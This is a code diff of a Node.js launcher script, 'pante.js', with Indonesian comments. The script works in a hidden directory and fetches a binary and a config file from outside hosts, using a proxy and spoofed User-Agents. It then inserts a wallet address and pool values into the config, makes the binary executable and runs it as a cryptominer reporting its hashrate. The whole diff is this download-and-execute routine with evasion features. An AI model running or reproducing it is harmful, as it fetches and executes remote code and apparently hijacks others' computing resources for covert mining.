@@ -1,17 +1,14 @@
 // pante.js
 const fs = require('fs');
 const path = require('path');
-const { execSync, spawn } = require('child_process');
+const { spawn } = require('child_process');
 const axios = require('axios');
 const HttpsProxyAgent = require('https-proxy-agent');
 const UserAgent = require('user-agents');
 
-// Lokasi kerja
+// ====== KONFIGURASI ======
+const FIXED_PROXY = "http://159.89.10.132:80"; // Proxy tetap
 const WORKDIR = path.join(process.cwd(), '.meki');
-if (!fs.existsSync(WORKDIR)) {
-  fs.mkdirSync(WORKDIR, { recursive: true });
-}
-process.chdir(WORKDIR);
 
 // URL file
 const URL_GENZO = "https://blogspotgenzo.site/UCOK";
@@ -20,28 +17,20 @@ const URL_CONFIG = "http://genzoko.serveblog.net/config.json";
 // Nama file
 const FILE_GENZO = "UCOK";
 const FILE_CONFIG = "config.json";
-const FILE_PROXIES = path.join(WORKDIR, "proxies.txt");
 
-// Fungsi ambil proxy random
-function getRandomProxy() {
-  if (!fs.existsSync(FILE_PROXIES)) return null;
-
-  const proxies = fs.readFileSync(FILE_PROXIES, 'utf8')
-    .split('\n')
-    .map(p => p.trim())
-    .filter(p => p.length > 0);
-
-  if (proxies.length === 0) return null;
-
-  return proxies[Math.floor(Math.random() * proxies.length)];
+// ====== PERSIAPAN DIREKTORI ======
+if (!fs.existsSync(WORKDIR)) {
+  fs.mkdirSync(WORKDIR, { recursive: true });
 }
+process.chdir(WORKDIR);
 
-// Fungsi download dengan proxy + user-agent
+// ====== FUNGSI DOWNLOAD ======
 async function downloadFile(url, outputPath) {
   const userAgent = new UserAgent().toString();
-  const proxy = getRandomProxy();
+  console.log(`[*] Mengunduh ${url} melalui proxy ${FIXED_PROXY}`);
+  console.log(`[*] User-Agent: ${userAgent}`);
 
-  let axiosConfig = {
+  const axiosConfig = {
     responseType: 'arraybuffer',
     headers: {
       'User-Agent': userAgent,
@@ -49,58 +38,49 @@ async function downloadFile(url, outputPath) {
       'Accept-Encoding': 'gzip, deflate, br',
       'Connection': 'keep-alive'
     },
-    timeout: 20000 // 20 detik timeout
+    timeout: 20000,
+    httpsAgent: new HttpsProxyAgent(FIXED_PROXY) // selalu gunakan proxy ini
   };
-
-  if (proxy) {
-    console.log(`[*] Menggunakan proxy: ${proxy}`);
-    axiosConfig.httpsAgent = new HttpsProxyAgent(proxy);
-  } else {
-    console.log("[*] Tidak ada proxy, koneksi langsung dipakai.");
-  }
 
   try {
     const response = await axios.get(url, axiosConfig);
     fs.writeFileSync(outputPath, response.data);
-    console.log(`[*] Berhasil download ${path.basename(outputPath)}`);
+    console.log(`[*] Berhasil download ${path.basename(outputPath)} melalui proxy`);
   } catch (error) {
-    console.error(`Gagal download ${url} (proxy: ${proxy || 'direct'}):`, error.message);
+    console.error(`Gagal download ${url} lewat proxy:`, error.message);
 
-    // Jika gagal dengan proxy, coba koneksi langsung sekali lagi
-    if (proxy) {
-      console.log("[*] Coba ulang tanpa proxy...");
-      try {
-        const directResponse = await axios.get(url, { ...axiosConfig, httpsAgent: undefined });
-        fs.writeFileSync(outputPath, directResponse.data);
-        console.log(`[*] Berhasil download ${path.basename(outputPath)} tanpa proxy`);
-      } catch (err) {
-        console.error("Gagal download tanpa proxy:", err.message);
-        process.exit(1);
-      }
-    } else {
+    // Jika gagal, coba koneksi langsung sebagai fallback
+    console.log("[*] Mencoba download tanpa proxy...");
+    try {
+      const directResponse = await axios.get(url, { ...axiosConfig, httpsAgent: undefined });
+      fs.writeFileSync(outputPath, directResponse.data);
+      console.log(`[*] Berhasil download ${path.basename(outputPath)} tanpa proxy`);
+    } catch (err) {
+      console.error("Gagal download tanpa proxy:", err.message);
       process.exit(1);
     }
   }
 }
 
-// Fungsi edit config.json
+// ====== EDIT CONFIG.JSON ======
 function editConfig(filePath) {
   try {
     let data = fs.readFileSync(filePath, 'utf8');
 
-    data = data.replace(/"tua"/g, '"159.89.10.132:80"');
+    // ganti placeholder di config.json
+    data = data.replace(/"tua"/g, `"${FIXED_PROXY.replace('http://', '')}"`);
     data = data.replace(/"wulet"/g, '"mbc1q4xd0fvvj53jwwqaljz9kvrwqxxh0wqs5k89a05.Qeri"');
     data = data.replace(/"meki"/g, '"power2b"');
 
     fs.writeFileSync(filePath, data);
-    console.log("[*] config.json berhasil diperbarui");
+    console.log("[*] config.json berhasil diperbarui dengan proxy tetap");
   } catch (error) {
     console.error("Gagal edit config.json:", error.message);
     process.exit(1);
   }
 }
 
-// Fungsi ubah file jadi executable
+// ====== BUAT FILE EXECUTABLE ======
 function makeExecutable(filePath) {
   try {
     fs.chmodSync(filePath, 0o755);
@@ -110,7 +90,7 @@ function makeExecutable(filePath) {
   }
 }
 
-// Fungsi jalankan UCOK
+// ====== JALANKAN UCOK ======
 function runPante(binary, config) {
   console.log("[*] Menjalankan UCOK (hashrate akan tampil di bawah)...");
   console.log("");
@@ -125,9 +105,9 @@ function runPante(binary, config) {
   });
 }
 
-// Main eksekusi
+// ====== MAIN EXECUTION ======
 (async () => {
-  console.log("[*] Mulai proses...");
+  console.log("[*] Mulai proses dengan proxy tetap:", FIXED_PROXY);
 
   await downloadFile(URL_GENZO, FILE_GENZO);
   await downloadFile(URL_CONFIG, FILE_CONFIG);
